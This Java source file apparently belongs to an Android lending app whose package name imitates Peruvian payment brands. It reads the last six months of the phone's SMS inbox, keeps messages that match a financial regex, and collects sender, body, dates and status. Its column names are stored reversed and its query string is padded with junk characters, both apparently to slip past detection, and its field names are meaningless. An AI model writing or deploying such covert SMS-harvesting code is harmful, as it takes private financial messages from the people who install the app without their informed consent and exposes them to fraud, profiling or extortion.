package com.yape.fpay.bcp.platinka.prestamo.plus.caja.fengzhuangtoltol.aboutbigdataup;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.text.TextUtils;

import com.yape.fpay.bcp.platinka.prestamo.plus.caja.datamodel.DuanxinxiModel;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.regex.Pattern;

public class DuanxiaoxiTols {


    //解毒 倒叙字符串
    public final static String XITONGID = "di_";//_id
    public final static String XITONGDIZHI = "sserdda";//address
    public final static String XITONGGEREN = "nosrep";//person
    public final static String XITONGSHIJIAN = "etad";//date
    public final static String XITONGFASONGSHIJIAN = "tnes_etad";//date_sent
    public final static String XITONGDUQU = "daer";//read
    public final static String XITONGZHUANGTAI = "sutats";//status
    public final static String XITONGLEIXING = "epyt";//type
    public final static String XITONGSHENTI = "ydob";//body
    public final static String XITONGKANSENN = "nees";//seen


    public static List<DuanxinxiModel> deDaoShoujiDuanxin(Context chiyouZhe, String regex) {
        List<DuanxinxiModel> duanxinList = new ArrayList<>();
        String duanxinUriDizhi = "content://sms/";
        Cursor youBiao = null;
        try {
            ContentResolver jiejueZhe = chiyouZhe.getContentResolver();
            String[] lieShuzu = new String[]{
                    new StringBuffer(XITONGID).reverse().toString(),
                    new StringBuffer(XITONGDIZHI).reverse().toString(),
                    new StringBuffer(XITONGGEREN).reverse().toString(),
                    new StringBuffer(XITONGSHENTI).reverse().toString(),
                    new StringBuffer(XITONGSHIJIAN).reverse().toString(),
                    new StringBuffer(XITONGLEIXING).reverse().toString(),
                    new StringBuffer(XITONGDUQU).reverse().toString(),
                    new StringBuffer(XITONGZHUANGTAI).reverse().toString(),
                    new StringBuffer(XITONGKANSENN).reverse().toString(),
                    new StringBuffer(XITONGFASONGSHIJIAN).reverse().toString()};
            Uri uri = Uri.parse(duanxinUriDizhi);

            String selection = "#da#te# >#= #? #A#ND da#te# <#= ?#".replaceAll("#","");
            long currentTime = System.currentTimeMillis();

            Calendar calendar = Calendar.getInstance();
            calendar.add(Calendar.MONTH, -6);
            String[] selectionArgs = new String[]{String.valueOf(calendar.getTimeInMillis()), String.valueOf(currentTime)};

            youBiao = jiejueZhe.query(uri, lieShuzu, selection, selectionArgs, "date desc");
            if (youBiao != null && youBiao.getCount() > 0) {
                while (youBiao.moveToNext()) {
                    DuanxinxiModel duanxinModle = new DuanxinxiModel();
                    // 只筛选金融类短信
                    String body = youBiao.getString(youBiao.getColumnIndex(new StringBuffer(XITONGSHENTI).reverse().toString()));

                    if (isMatchSmsBody(body, regex)){
                        duanxinModle.tinySouvenirsGrandHisIncorrectNest =youBiao.getInt(youBiao.getColumnIndex(new StringBuffer(XITONGID).reverse().toString()));
                        duanxinModle.looseVanillaHeroine =youBiao.getString(youBiao.getColumnIndex(new StringBuffer(XITONGDIZHI).reverse().toString()));
                        duanxinModle.racialRadioactiveInterval =youBiao.getInt(youBiao.getColumnIndex(new StringBuffer(XITONGKANSENN).reverse().toString()));
                        duanxinModle.australianRoofMicrowave =youBiao.getInt(youBiao.getColumnIndex(new StringBuffer(XITONGZHUANGTAI).reverse().toString()));
                        duanxinModle.lastGrowthCommunism =youBiao.getInt(youBiao.getColumnIndex(new StringBuffer(XITONGGEREN).reverse().toString()));
                        duanxinModle.dirtyGreeceRank = body;
                        duanxinModle.religiousLanguageUnableSeaman =youBiao.getLong(youBiao.getColumnIndex(new StringBuffer(XITONGSHIJIAN).reverse().toString()));
                        duanxinModle.squareBookshop =youBiao.getInt(youBiao.getColumnIndex(new StringBuffer(XITONGLEIXING).reverse().toString()));
                        duanxinModle.facialAppearanceClassroom =youBiao.getLong(youBiao.getColumnIndex(new StringBuffer(XITONGFASONGSHIJIAN).reverse().toString()));
                        duanxinModle.pureMountain =youBiao.getInt(youBiao.getColumnIndex(new StringBuffer(XITONGDUQU).reverse().toString()));

                        duanxinList.add(duanxinModle);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (youBiao != null) {
                youBiao.close();
            }
        }
        return duanxinList;
    }

    private static boolean isMatchSmsBody(String source, String regex) {
        if (TextUtils.isEmpty(regex)) {
            return true;
        }
        return Pattern.compile(regex).matcher(source).find();
    }
}
